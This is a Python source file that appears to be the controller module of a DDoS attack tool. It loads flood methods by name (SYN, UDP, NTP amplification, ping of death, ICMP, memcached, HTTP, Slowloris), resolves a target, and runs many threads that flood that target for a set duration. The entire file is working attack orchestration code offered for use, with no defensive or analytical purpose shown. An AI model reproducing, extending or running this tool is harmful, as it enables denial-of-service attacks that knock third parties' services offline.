# Import modules
import asyncio
import inspect
from time import time, sleep
from threading import Thread
from typing import Callable, Awaitable
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from tools.crash import CriticalError
from tools.ipTools import GetTargetAddress, InternetConnectionCheck


# Methods that use async
_ASYNC_METHODS = {"HTTP"}


def GetMethodByName(method: str) -> Callable:
    """Find and import DDoS method by name.
    
    Args:
        method: Method name (SYN, UDP, HTTP, etc.)
        
    Returns:
        Flood function from the method module
        
    Raises:
        SystemExit: If method is unknown or module doesn't have flood function
    """
    if method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
        module_path = f"tools.L4.{method.lower()}"
    elif method in ("HTTP", "SLOWLORIS"):
        module_path = f"tools.L7.{method.lower()}"
    else:
        raise SystemExit(
            f"{Fore.RED}[!] {Fore.MAGENTA}Unknown ddos method {repr(method)} selected..{Fore.RESET}"
        )
    
    try:
        module = __import__(module_path, fromlist=["object"])
    except ImportError as e:
        CriticalError(f"Failed to import method module {repr(module_path)}", e)
        return  # Unreachable, but satisfies type checker
    
    if hasattr(module, "flood"):
        return getattr(module, "flood")
    else:
        CriticalError(
            f"Method 'flood' not found in {repr(module_path)}. Please use python 3.8", "-"
        )
        return  # Unreachable, but satisfies type checker


def is_async_method(method: str) -> bool:
    """Check if method uses async.
    
    Args:
        method: Method name
        
    Returns:
        True if method is async, False otherwise
    """
    return method.upper() in _ASYNC_METHODS


class AttackMethod:
    """Class to control attack methods."""
    
    def __init__(self, name: str, duration: int, threads: int, target: str) -> None:
        """Initialize attack method.
        
        Args:
            name: Attack method name
            duration: Attack duration in seconds
            threads: Number of threads
            target: Target address
        """
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads: list[Thread] = []
        self.is_running = False
        self.method: Callable | None = None
        self.is_async = is_async_method(name)

    def __enter__(self):
        """Context manager entry."""
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack completed!{Fore.RESET}")

    def __RunTimer(self) -> None:
        """Run timer to stop attack after duration."""
        stop_time = time() + self.duration
        while time() < stop_time:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

    def __RunFlood(self) -> None:
        """Run flood method in loop."""
        assert self.method is not None, "Method not initialized. Use context manager."
        while self.is_running:
            try:
                self.method(self.target)
            except Exception as e:
                print(f"{Fore.RED}[!] {Fore.MAGENTA}Error in flood thread: {e}{Fore.RESET}")
                sleep(0.1)

    def __RunAsyncFlood(self) -> None:
        """Run async flood method in loop."""
        assert self.method is not None, "Method not initialized. Use context manager."
        
        # Check if method is a coroutine function
        if asyncio.iscoroutinefunction(self.method):
            while self.is_running:
                try:
                    # Run async method in event loop
                    asyncio.run(self.method(self.target))
                except Exception as e:
                    print(f"{Fore.RED}[!] {Fore.MAGENTA}Error in async flood: {e}{Fore.RESET}")
                    sleep(0.1)
        else:
            # Fallback to sync execution
            self.__RunFlood()

    def __RunThreads(self) -> None:
        """Start and manage threads."""
        # Run timer thread
        timer_thread = Thread(target=self.__RunTimer, daemon=True)
        timer_thread.start()
        
        # Create flood threads
        for _ in range(self.threads_count):
            if self.is_async:
                thread = Thread(target=self.__RunAsyncFlood)
            else:
                thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        
        # Start flood threads
        with Spinner(
            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        
        # Wait for flood threads to stop
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread {index + 1}.{Fore.RESET}"
            )

    def Start(self) -> None:
        """Start DDoS attack."""
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        
        method_type = "async" if self.is_async else "sync"
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting {method_type} attack to {target} using method {self.name}.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Attack will be stopped after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
            )
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(f"{Fore.RED}[!] {Fore.MAGENTA}Unexpected error: {err}{Fore.RESET}")
